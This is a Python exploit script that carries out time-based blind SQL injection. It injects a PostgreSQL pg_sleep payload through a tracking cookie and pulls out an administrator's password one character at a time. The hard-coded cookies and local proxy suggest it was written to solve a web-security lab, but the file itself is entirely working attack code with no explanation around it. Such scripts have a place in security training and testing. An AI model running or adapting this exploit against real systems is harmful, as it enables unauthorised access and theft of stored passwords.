import sys
import requests
import urllib3
import urllib
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "'; SELECT CASE WHEN ((SELECT COUNT(username) FROM users where username = 'administrator' AND ascii(SUBSTRING(password, %s , 1))= '%s')=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'AaR6mdqOea5HmzSt' + sqli_payload_encoded, 'session': 'IgIATf6dLPrk6BikLmB0q86BEeHKCfQl'}
            start = time.time()
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            elapsed = time.time() - start
            if elapsed < 4:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()